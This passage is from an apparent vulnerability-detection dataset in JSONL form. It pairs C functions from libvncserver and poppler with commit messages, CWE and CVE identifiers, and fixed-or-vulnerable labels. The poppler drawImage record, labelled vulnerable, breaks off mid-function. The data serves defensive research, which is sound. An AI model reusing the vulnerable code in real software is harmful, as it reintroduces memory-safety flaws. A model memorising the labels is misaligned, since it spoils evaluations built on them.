affected in 2.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6272"}
{"idx": 359965, "project": "libvncserver", "commit_id": "05a9bd41a8ec0a9d580a8f420f41718bdd235446", "project_url": "https://github.com/LibVNC/libvncserver", "commit_url": "https://github.com/newsoft/libvncserver/commit/05a9bd41a8ec0a9d580a8f420f41718bdd235446", "commit_message": "Do not accept a scaling factor of zero on PalmVNCSetScaleFactor and SetScale client->server messages. This would cause a division by zero and crash the server.", "target": 0, "func": "rfbProcessClientNormalMessage(rfbClientPtr cl)\n{\n    int n=0;\n    rfbClientToServerMsg msg;\n    char *str;\n    int i;\n    uint32_t enc=0;\n    uint32_t lastPreferredEncoding = -1;\n    char encBuf[64];\n    char encBuf2[64];\n\n#ifdef LIBVNCSERVER_WITH_WEBSOCKETS\n    if (cl->wsctx && webSocketCheckDisconnect(cl))\n      return;\n#endif\n\n    if ((n = rfbReadExact(cl, (char *)&msg, 1)) <= 0) {\n        if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n        rfbCloseClient(cl);\n        return;\n    }\n\n    switch (msg.type) {\n\n    case rfbSetPixelFormat:\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbSetPixelFormatMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        cl->format.bitsPerPixel = msg.spf.format.bitsPerPixel;\n        cl->format.depth = msg.spf.format.depth;\n        cl->format.bigEndian = (msg.spf.format.bigEndian ? TRUE : FALSE);\n        cl->format.trueColour = (msg.spf.format.trueColour ? TRUE : FALSE);\n        cl->format.redMax = Swap16IfLE(msg.spf.format.redMax);\n        cl->format.greenMax = Swap16IfLE(msg.spf.format.greenMax);\n        cl->format.blueMax = Swap16IfLE(msg.spf.format.blueMax);\n        cl->format.redShift = msg.spf.format.redShift;\n        cl->format.greenShift = msg.spf.format.greenShift;\n        cl->format.blueShift = msg.spf.format.blueShift;\n\n\tcl->readyForSetColourMapEntries = TRUE;\n        cl->screen->setTranslateFunction(cl);\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetPixelFormatMsg, sz_rfbSetPixelFormatMsg);\n\n        return;\n\n\n    case rfbFixColourMapEntries:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbFixColourMapEntriesMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetPixelFormatMsg, sz_rfbSetPixelFormatMsg);\n        rfbLog(\"rfbProcessClientNormalMessage: %s\",\n                \"FixColourMapEntries unsupported\\n\");\n        rfbCloseClient(cl);\n        return;\n\n\n    /* NOTE: Some clients send us a set of encodings (ie: PointerPos) designed to enable/disable features...\n     * We may want to look into this...\n     * Example:\n     *     case rfbEncodingXCursor:\n     *         cl->enableCursorShapeUpdates = TRUE;\n     *\n     * Currently: cl->enableCursorShapeUpdates can *never* be turned off...\n     */\n    case rfbSetEncodings:\n    {\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbSetEncodingsMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        msg.se.nEncodings = Swap16IfLE(msg.se.nEncodings);\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetEncodingsMsg+(msg.se.nEncodings*4),sz_rfbSetEncodingsMsg+(msg.se.nEncodings*4));\n\n        /*\n         * UltraVNC Client has the ability to adapt to changing network environments\n         * So, let's give it a change to tell us what it wants now!\n         */\n        if (cl->preferredEncoding!=-1)\n            lastPreferredEncoding = cl->preferredEncoding;\n\n        /* Reset all flags to defaults (allows us to switch between PointerPos and Server Drawn Cursors) */\n        cl->preferredEncoding=-1;\n        cl->useCopyRect              = FALSE;\n        cl->useNewFBSize             = FALSE;\n        cl->cursorWasChanged         = FALSE;\n        cl->useRichCursorEncoding    = FALSE;\n        cl->enableCursorPosUpdates   = FALSE;\n        cl->enableCursorShapeUpdates = FALSE;\n        cl->enableCursorShapeUpdates = FALSE;\n        cl->enableLastRectEncoding   = FALSE;\n        cl->enableKeyboardLedState   = FALSE;\n        cl->enableSupportedMessages  = FALSE;\n        cl->enableSupportedEncodings = FALSE;\n        cl->enableServerIdentity     = FALSE;\n#if defined(LIBVNCSERVER_HAVE_LIBZ) || defined(LIBVNCSERVER_HAVE_LIBPNG)\n        cl->tightQualityLevel        = -1;\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n        cl->tightCompressLevel       = TIGHT_DEFAULT_COMPRESSION;\n        cl->turboSubsampLevel        = TURBO_DEFAULT_SUBSAMP;\n        cl->turboQualityLevel        = -1;\n#endif\n#endif\n\n\n        for (i = 0; i < msg.se.nEncodings; i++) {\n            if ((n = rfbReadExact(cl, (char *)&enc, 4)) <= 0) {\n                if (n != 0)\n                    rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n                rfbCloseClient(cl);\n                return;\n            }\n            enc = Swap32IfLE(enc);\n\n            switch (enc) {\n\n            case rfbEncodingCopyRect:\n\t\tcl->useCopyRect = TRUE;\n                break;\n            case rfbEncodingRaw:\n            case rfbEncodingRRE:\n            case rfbEncodingCoRRE:\n            case rfbEncodingHextile:\n            case rfbEncodingUltra:\n#ifdef LIBVNCSERVER_HAVE_LIBZ\n\t    case rfbEncodingZlib:\n            case rfbEncodingZRLE:\n            case rfbEncodingZYWRLE:\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t    case rfbEncodingTight:\n#endif\n#endif\n#ifdef LIBVNCSERVER_HAVE_LIBPNG\n\t    case rfbEncodingTightPng:\n#endif\n            /* The first supported encoding is the 'preferred' encoding */\n                if (cl->preferredEncoding == -1)\n                    cl->preferredEncoding = enc;\n\n\n                break;\n\t    case rfbEncodingXCursor:\n\t\tif(!cl->screen->dontConvertRichCursorToXCursor) {\n\t\t    rfbLog(\"Enabling X-style cursor updates for client %s\\n\",\n\t\t\t   cl->host);\n\t\t    /* if cursor was drawn, hide the cursor */\n\t\t    if(!cl->enableCursorShapeUpdates)\n\t\t        rfbRedrawAfterHideCursor(cl,NULL);\n\n\t\t    cl->enableCursorShapeUpdates = TRUE;\n\t\t    cl->cursorWasChanged = TRUE;\n\t\t}\n\t\tbreak;\n\t    case rfbEncodingRichCursor:\n\t        rfbLog(\"Enabling full-color cursor updates for client %s\\n\",\n\t\t       cl->host);\n\t\t/* if cursor was drawn, hide the cursor */\n\t\tif(!cl->enableCursorShapeUpdates)\n\t\t    rfbRedrawAfterHideCursor(cl,NULL);\n\n\t        cl->enableCursorShapeUpdates = TRUE;\n\t        cl->useRichCursorEncoding = TRUE;\n\t        cl->cursorWasChanged = TRUE;\n\t        break;\n\t    case rfbEncodingPointerPos:\n\t\tif (!cl->enableCursorPosUpdates) {\n\t\t    rfbLog(\"Enabling cursor position updates for client %s\\n\",\n\t\t\t   cl->host);\n\t\t    cl->enableCursorPosUpdates = TRUE;\n\t\t    cl->cursorWasMoved = TRUE;\n\t\t}\n\t        break;\n\t    case rfbEncodingLastRect:\n\t\tif (!cl->enableLastRectEncoding) {\n\t\t    rfbLog(\"Enabling LastRect protocol extension for client \"\n\t\t\t   \"%s\\n\", cl->host);\n\t\t    cl->enableLastRectEncoding = TRUE;\n\t\t}\n\t\tbreak;\n\t    case rfbEncodingNewFBSize:\n\t\tif (!cl->useNewFBSize) {\n\t\t    rfbLog(\"Enabling NewFBSize protocol extension for client \"\n\t\t\t   \"%s\\n\", cl->host);\n\t\t    cl->useNewFBSize = TRUE;\n\t\t}\n\t\tbreak;\n            case rfbEncodingKeyboardLedState:\n                if (!cl->enableKeyboardLedState) {\n                  rfbLog(\"Enabling KeyboardLedState protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableKeyboardLedState = TRUE;\n                }\n                break;           \n            case rfbEncodingSupportedMessages:\n                if (!cl->enableSupportedMessages) {\n                  rfbLog(\"Enabling SupportedMessages protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableSupportedMessages = TRUE;\n                }\n                break;           \n            case rfbEncodingSupportedEncodings:\n                if (!cl->enableSupportedEncodings) {\n                  rfbLog(\"Enabling SupportedEncodings protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableSupportedEncodings = TRUE;\n                }\n                break;           \n            case rfbEncodingServerIdentity:\n                if (!cl->enableServerIdentity) {\n                  rfbLog(\"Enabling ServerIdentity protocol extension for client \"\n                          \"%s\\n\", cl->host);\n                  cl->enableServerIdentity = TRUE;\n                }\n                break;\n\t    case rfbEncodingXvp:\n\t        rfbLog(\"Enabling Xvp protocol extension for client \"\n\t\t        \"%s\\n\", cl->host);\n\t\tif (!rfbSendXvp(cl, 1, rfbXvp_Init)) {\n\t\t  rfbCloseClient(cl);\n\t\t  return;\n\t\t}\n                break;\n            default:\n#if defined(LIBVNCSERVER_HAVE_LIBZ) || defined(LIBVNCSERVER_HAVE_LIBPNG)\n\t\tif ( enc >= (uint32_t)rfbEncodingCompressLevel0 &&\n\t\t     enc <= (uint32_t)rfbEncodingCompressLevel9 ) {\n\t\t    cl->zlibCompressLevel = enc & 0x0F;\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t\t    cl->tightCompressLevel = enc & 0x0F;\n\t\t    rfbLog(\"Using compression level %d for client %s\\n\",\n\t\t\t   cl->tightCompressLevel, cl->host);\n#endif\n\t\t} else if ( enc >= (uint32_t)rfbEncodingQualityLevel0 &&\n\t\t\t    enc <= (uint32_t)rfbEncodingQualityLevel9 ) {\n\t\t    cl->tightQualityLevel = enc & 0x0F;\n\t\t    rfbLog(\"Using image quality level %d for client %s\\n\",\n\t\t\t   cl->tightQualityLevel, cl->host);\n#ifdef LIBVNCSERVER_HAVE_LIBJPEG\n\t\t    cl->turboQualityLevel = tight2turbo_qual[enc & 0x0F];\n\t\t    cl->turboSubsampLevel = tight2turbo_subsamp[enc & 0x0F];\n\t\t    rfbLog(\"Using JPEG subsampling %d, Q%d for client %s\\n\",\n\t\t\t   cl->turboSubsampLevel, cl->turboQualityLevel, cl->host);\n\t\t} else if ( enc >= (uint32_t)rfbEncodingFineQualityLevel0 + 1 &&\n\t\t\t    enc <= (uint32_t)rfbEncodingFineQualityLevel100 ) {\n\t\t    cl->turboQualityLevel = enc & 0xFF;\n\t\t    rfbLog(\"Using fine quality level %d for client %s\\n\",\n\t\t\t   cl->turboQualityLevel, cl->host);\n\t\t} else if ( enc >= (uint32_t)rfbEncodingSubsamp1X &&\n\t\t\t    enc <= (uint32_t)rfbEncodingSubsampGray ) {\n\t\t    cl->turboSubsampLevel = enc & 0xFF;\n\t\t    rfbLog(\"Using subsampling level %d for client %s\\n\",\n\t\t\t   cl->turboSubsampLevel, cl->host);\n#endif\n\t\t} else\n#endif\n\t\t{\n\t\t\trfbExtensionData* e;\n\t\t\tfor(e = cl->extensions; e;) {\n\t\t\t\trfbExtensionData* next = e->next;\n\t\t\t\tif(e->extension->enablePseudoEncoding &&\n\t\t\t\t\te->extension->enablePseudoEncoding(cl,\n\t\t\t\t\t\t&e->data, (int)enc))\n\t\t\t\t\t/* ext handles this encoding */\n\t\t\t\t\tbreak;\n\t\t\t\te = next;\n\t\t\t}\n\t\t\tif(e == NULL) {\n\t\t\t\trfbBool handled = FALSE;\n\t\t\t\t/* if the pseudo encoding is not handled by the\n\t\t\t\t   enabled extensions, search through all\n\t\t\t\t   extensions. */\n\t\t\t\trfbProtocolExtension* e;\n\n\t\t\t\tfor(e = rfbGetExtensionIterator(); e;) {\n\t\t\t\t\tint* encs = e->pseudoEncodings;\n\t\t\t\t\twhile(encs && *encs!=0) {\n\t\t\t\t\t\tif(*encs==(int)enc) {\n\t\t\t\t\t\t\tvoid* data = NULL;\n\t\t\t\t\t\t\tif(!e->enablePseudoEncoding(cl, &data, (int)enc)) {\n\t\t\t\t\t\t\t\trfbLog(\"Installed extension pretends to handle pseudo encoding 0x%x, but does not!\\n\",(int)enc);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\trfbEnableExtension(cl, e, data);\n\t\t\t\t\t\t\t\thandled = TRUE;\n\t\t\t\t\t\t\t\te = NULL;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tencs++;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(e)\n\t\t\t\t\t\te = e->next;\n\t\t\t\t}\n\t\t\t\trfbReleaseExtensionIterator();\n\n\t\t\t\tif(!handled)\n\t\t\t\t\trfbLog(\"rfbProcessClientNormalMessage: \"\n\t\t\t\t\t    \"ignoring unsupported encoding type %s\\n\",\n\t\t\t\t\t    encodingName(enc,encBuf,sizeof(encBuf)));\n\t\t\t}\n\t\t}\n            }\n        }\n\n\n\n        if (cl->preferredEncoding == -1) {\n            if (lastPreferredEncoding==-1) {\n                cl->preferredEncoding = rfbEncodingRaw;\n                rfbLog(\"Defaulting to %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n            }\n            else {\n                cl->preferredEncoding = lastPreferredEncoding;\n                rfbLog(\"Sticking with %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n            }\n        }\n        else\n        {\n          if (lastPreferredEncoding==-1) {\n              rfbLog(\"Using %s encoding for client %s\\n\", encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)),cl->host);\n          } else {\n              rfbLog(\"Switching from %s to %s Encoding for client %s\\n\", \n                  encodingName(lastPreferredEncoding,encBuf2,sizeof(encBuf2)),\n                  encodingName(cl->preferredEncoding,encBuf,sizeof(encBuf)), cl->host);\n          }\n        }\n        \n\tif (cl->enableCursorPosUpdates && !cl->enableCursorShapeUpdates) {\n\t  rfbLog(\"Disabling cursor position updates for client %s\\n\",\n\t\t cl->host);\n\t  cl->enableCursorPosUpdates = FALSE;\n\t}\n\n        return;\n    }\n\n\n    case rfbFramebufferUpdateRequest:\n    {\n        sraRegionPtr tmpRegion;\n\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                           sz_rfbFramebufferUpdateRequestMsg-1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbFramebufferUpdateRequestMsg,sz_rfbFramebufferUpdateRequestMsg);\n\n        /* The values come in based on the scaled screen, we need to convert them to\n         * values based on the main screen's coordinate system\n         */\n\tif(!rectSwapIfLEAndClip(&msg.fur.x,&msg.fur.y,&msg.fur.w,&msg.fur.h,cl))\n\t{\n\t        rfbLog(\"Warning, ignoring rfbFramebufferUpdateRequest: %dXx%dY-%dWx%dH\\n\",msg.fur.x, msg.fur.y, msg.fur.w, msg.fur.h);\n\t\treturn;\n        }\n \n        \n\ttmpRegion =\n\t  sraRgnCreateRect(msg.fur.x,\n\t\t\t   msg.fur.y,\n\t\t\t   msg.fur.x+msg.fur.w,\n\t\t\t   msg.fur.y+msg.fur.h);\n\n        LOCK(cl->updateMutex);\n\tsraRgnOr(cl->requestedRegion,tmpRegion);\n\n\tif (!cl->readyForSetColourMapEntries) {\n\t    /* client hasn't sent a SetPixelFormat so is using server's */\n\t    cl->readyForSetColourMapEntries = TRUE;\n\t    if (!cl->format.trueColour) {\n\t\tif (!rfbSetClientColourMap(cl, 0, 0)) {\n\t\t    sraRgnDestroy(tmpRegion);\n\t\t    TSIGNAL(cl->updateCond);\n\t\t    UNLOCK(cl->updateMutex);\n\t\t    return;\n\t\t}\n\t    }\n\t}\n\n       if (!msg.fur.incremental) {\n\t    sraRgnOr(cl->modifiedRegion,tmpRegion);\n\t    sraRgnSubtract(cl->copyRegion,tmpRegion);\n       }\n       TSIGNAL(cl->updateCond);\n       UNLOCK(cl->updateMutex);\n\n       sraRgnDestroy(tmpRegion);\n\n       return;\n    }\n\n    case rfbKeyEvent:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbKeyEventMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbKeyEventMsg, sz_rfbKeyEventMsg);\n\n\tif(!cl->viewOnly) {\n\t    cl->screen->kbdAddEvent(msg.ke.down, (rfbKeySym)Swap32IfLE(msg.ke.key), cl);\n\t}\n\n        return;\n\n\n    case rfbPointerEvent:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbPointerEventMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbPointerEventMsg, sz_rfbPointerEventMsg);\n\t\n\tif (cl->screen->pointerClient && cl->screen->pointerClient != cl)\n\t    return;\n\n\tif (msg.pe.buttonMask == 0)\n\t    cl->screen->pointerClient = NULL;\n\telse\n\t    cl->screen->pointerClient = cl;\n\n\tif(!cl->viewOnly) {\n\t    if (msg.pe.buttonMask != cl->lastPtrButtons ||\n\t\t    cl->screen->deferPtrUpdateTime == 0) {\n\t\tcl->screen->ptrAddEvent(msg.pe.buttonMask,\n\t\t\tScaleX(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.x)), \n\t\t\tScaleY(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.y)),\n\t\t\tcl);\n\t\tcl->lastPtrButtons = msg.pe.buttonMask;\n\t    } else {\n\t\tcl->lastPtrX = ScaleX(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.x));\n\t\tcl->lastPtrY = ScaleY(cl->scaledScreen, cl->screen, Swap16IfLE(msg.pe.y));\n\t\tcl->lastPtrButtons = msg.pe.buttonMask;\n\t    }\n      }      \n      return;\n\n\n    case rfbFileTransfer:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbFileTransferMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        msg.ft.size         = Swap32IfLE(msg.ft.size);\n        msg.ft.length       = Swap32IfLE(msg.ft.length);\n        /* record statistics in rfbProcessFileTransfer as length is filled with garbage when it is not valid */\n        rfbProcessFileTransfer(cl, msg.ft.contentType, msg.ft.contentParam, msg.ft.size, msg.ft.length);\n        return;\n\n    case rfbSetSW:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbSetSWMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        msg.sw.x = Swap16IfLE(msg.sw.x);\n        msg.sw.y = Swap16IfLE(msg.sw.y);\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetSWMsg, sz_rfbSetSWMsg);\n        /* msg.sw.status is not initialized in the ultraVNC viewer and contains random numbers (why???) */\n\n        rfbLog(\"Received a rfbSetSingleWindow(%d x, %d y)\\n\", msg.sw.x, msg.sw.y);\n        if (cl->screen->setSingleWindow!=NULL)\n            cl->screen->setSingleWindow(cl, msg.sw.x, msg.sw.y);\n        return;\n\n    case rfbSetServerInput:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbSetServerInputMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetServerInputMsg, sz_rfbSetServerInputMsg);\n\n        /* msg.sim.pad is not initialized in the ultraVNC viewer and contains random numbers (why???) */\n        /* msg.sim.pad = Swap16IfLE(msg.sim.pad); */\n\n        rfbLog(\"Received a rfbSetServerInput(%d status)\\n\", msg.sim.status);\n        if (cl->screen->setServerInput!=NULL)\n            cl->screen->setServerInput(cl, msg.sim.status);\n        return;\n        \n    case rfbTextChat:\n        if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n                              sz_rfbTextChatMsg - 1)) <= 0) {\n            if (n != 0)\n                rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n            rfbCloseClient(cl);\n            return;\n        }\n        \n        msg.tc.pad2   = Swap16IfLE(msg.tc.pad2);\n        msg.tc.length = Swap32IfLE(msg.tc.length);\n\n        switch (msg.tc.length) {\n        case rfbTextChatOpen:\n        case rfbTextChatClose:\n        case rfbTextChatFinished:\n            /* commands do not have text following */\n            /* Why couldn't they have used the pad byte??? */\n            str=NULL;\n            rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbTextChatMsg, sz_rfbTextChatMsg);\n            break;\n        default:\n            if ((msg.tc.length>0) && (msg.tc.length<rfbTextMaxSize))\n            {\n                str = (char *)malloc(msg.tc.length);\n                if (str==NULL)\n                {\n                    rfbLog(\"Unable to malloc %d bytes for a TextChat Message\\n\", msg.tc.length);\n                    rfbCloseClient(cl);\n                    return;\n                }\n                if ((n = rfbReadExact(cl, str, msg.tc.length)) <= 0) {\n                    if (n != 0)\n                        rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n                    free(str);\n                    rfbCloseClient(cl);\n                    return;\n                }\n                rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbTextChatMsg+msg.tc.length, sz_rfbTextChatMsg+msg.tc.length);\n            }\n            else\n            {\n                /* This should never happen */\n                rfbLog(\"client sent us a Text Message that is too big %d>%d\\n\", msg.tc.length, rfbTextMaxSize);\n                rfbCloseClient(cl);\n                return;\n            }\n        }\n\n        /* Note: length can be commands: rfbTextChatOpen, rfbTextChatClose, and rfbTextChatFinished\n         * at which point, the str is NULL (as it is not sent)\n         */\n        if (cl->screen->setTextChat!=NULL)\n            cl->screen->setTextChat(cl, msg.tc.length, str);\n\n        free(str);\n        return;\n\n\n    case rfbClientCutText:\n\n\tif ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n\t\t\t   sz_rfbClientCutTextMsg - 1)) <= 0) {\n\t    if (n != 0)\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\n\tmsg.cct.length = Swap32IfLE(msg.cct.length);\n\n\tstr = (char *)malloc(msg.cct.length);\n\tif (str == NULL) {\n\t\trfbLogPerror(\"rfbProcessClientNormalMessage: not enough memory\");\n\t\trfbCloseClient(cl);\n\t\treturn;\n\t}\n\n\tif ((n = rfbReadExact(cl, str, msg.cct.length)) <= 0) {\n\t    if (n != 0)\n\t        rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n\t    free(str);\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n\trfbStatRecordMessageRcvd(cl, msg.type, sz_rfbClientCutTextMsg+msg.cct.length, sz_rfbClientCutTextMsg+msg.cct.length);\n\tif(!cl->viewOnly) {\n\t    cl->screen->setXCutText(str, msg.cct.length, cl);\n\t}\n\tfree(str);\n\n        return;\n\n    case rfbPalmVNCSetScaleFactor:\n      cl->PalmVNC = TRUE;\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbSetScaleMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n\n      if (msg.ssc.scale == 0) {\n          rfbLogPerror(\"rfbProcessClientNormalMessage: will not accept a scale factor of zero\");\n          rfbCloseClient(cl);\n          return;\n      }\n\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetScaleMsg, sz_rfbSetScaleMsg);\n      rfbLog(\"rfbSetScale(%d)\\n\", msg.ssc.scale);\n      rfbScalingSetup(cl,cl->screen->width/msg.ssc.scale, cl->screen->height/msg.ssc.scale);\n\n      rfbSendNewScaleSize(cl);\n      return;\n      \n    case rfbSetScale:\n\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbSetScaleMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n\n      if (msg.ssc.scale == 0) {\n          rfbLogPerror(\"rfbProcessClientNormalMessage: will not accept a scale factor of zero\");\n          rfbCloseClient(cl);\n          return;\n      }\n\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetScaleMsg, sz_rfbSetScaleMsg);\n      rfbLog(\"rfbSetScale(%d)\\n\", msg.ssc.scale);\n      rfbScalingSetup(cl,cl->screen->width/msg.ssc.scale, cl->screen->height/msg.ssc.scale);\n\n      rfbSendNewScaleSize(cl);\n      return;\n\n    case rfbXvp:\n\n      if ((n = rfbReadExact(cl, ((char *)&msg) + 1,\n          sz_rfbXvpMsg - 1)) <= 0) {\n          if (n != 0)\n            rfbLogPerror(\"rfbProcessClientNormalMessage: read\");\n          rfbCloseClient(cl);\n          return;\n      }\n      rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbXvpMsg, sz_rfbXvpMsg);\n\n      /* only version when is defined, so echo back a fail */\n      if(msg.xvp.version != 1) {\n\trfbSendXvp(cl, msg.xvp.version, rfbXvp_Fail);\n      }\n      else {\n\t/* if the hook exists and fails, send a fail msg */\n\tif(cl->screen->xvpHook && !cl->screen->xvpHook(cl, msg.xvp.version, msg.xvp.code))\n\t  rfbSendXvp(cl, 1, rfbXvp_Fail);\n      }\n      return;\n\n    default:\n\t{\n\t    rfbExtensionData *e,*next;\n\n\t    for(e=cl->extensions; e;) {\n\t\tnext = e->next;\n\t\tif(e->extension->handleMessage &&\n\t\t\te->extension->handleMessage(cl, e->data, &msg))\n                {\n                    rfbStatRecordMessageRcvd(cl, msg.type, 0, 0); /* Extension should handle this */\n\t\t    return;\n                }\n\t\te = next;\n\t    }\n\n\t    rfbLog(\"rfbProcessClientNormalMessage: unknown message type %d\\n\",\n\t\t    msg.type);\n\t    rfbLog(\" ... closing connection\\n\");\n\t    rfbCloseClient(cl);\n\t    return;\n\t}\n    }\n}", "func_hash": 229169901904628177231139448774675799364, "file_name": "rfbserver.c", "file_hash": 245143555823770309940026180407901527002, "cwe": ["CWE-189"], "cve": "CVE-2014-6054", "cve_desc": "The rfbProcessClientNormalMessage function in libvncserver/rfbserver.c in LibVNCServer 0.9.9 and earlier allows remote attackers to cause a denial of service (divide-by-zero error and server crash) via a zero value in the scaling factor in a (1) PalmVNCSetScaleFactor or (2) SetScale message.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6054"}
{"idx": 361255, "project": "libvncserver", "commit_id": "045a044e8ae79db9244593fbce154cdf6e843273", "project_url": "https://github.com/LibVNC/libvncserver", "commit_url": "https://github.com/newsoft/libvncserver/commit/045a044e8ae79db9244593fbce154cdf6e843273", "commit_message": "Fix integer overflow in MallocFrameBuffer()\n\nPromote integers to uint64_t to avoid integer overflow issue during\nframe buffer allocation for very large screen sizes", "target": 0, "func": "static rfbBool MallocFrameBuffer(rfbClient* client) {\nuint64_t allocSize;\n\n  if(client->frameBuffer)\n    free(client->frameBuffer);\n\n  /* SECURITY: promote 'width' into uint64_t so that the multiplication does not overflow\n     'width' and 'height' are 16-bit integers per RFB protocol design\n     SIZE_MAX is the maximum value that can fit into size_t\n  */\n  allocSize = (uint64_t)client->width * client->height * client->format.bitsPerPixel/8;\n\n  if (allocSize >= SIZE_MAX) {\n    rfbClientErr(\"CRITICAL: cannot allocate frameBuffer, requested size is too large\\n\");\n    return FALSE;\n  }\n\n  client->frameBuffer=malloc( (size_t)allocSize );\n\n  if (client->frameBuffer == NULL)\n    rfbClientErr(\"CRITICAL: frameBuffer allocation failed, requested size too large or not enough memory?\\n\");\n\n  return client->frameBuffer?TRUE:FALSE;\n}", "func_hash": 46219224644773756406958783944501987250, "file_name": "vncviewer.c", "file_hash": 59162983907888381556256780180693825442, "cwe": ["CWE-189"], "cve": "CVE-2014-6051", "cve_desc": "Integer overflow in the MallocFrameBuffer function in vncviewer.c in LibVNCServer 0.9.9 and earlier allows remote VNC servers to cause a denial of service (crash) and possibly execute arbitrary code via an advertisement for a large screen size, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6051"}
{"idx": 27, "project": "poppler", "commit_id": "284a92899602daa4a7f429e61849e794569310b5", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=284a92899602daa4a7f429e61849e794569310b5", "commit_message": "Did a mistake in the gmalloc -> gmallocn commit, it's a 4 here not a 3", "target": 1, "func": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = 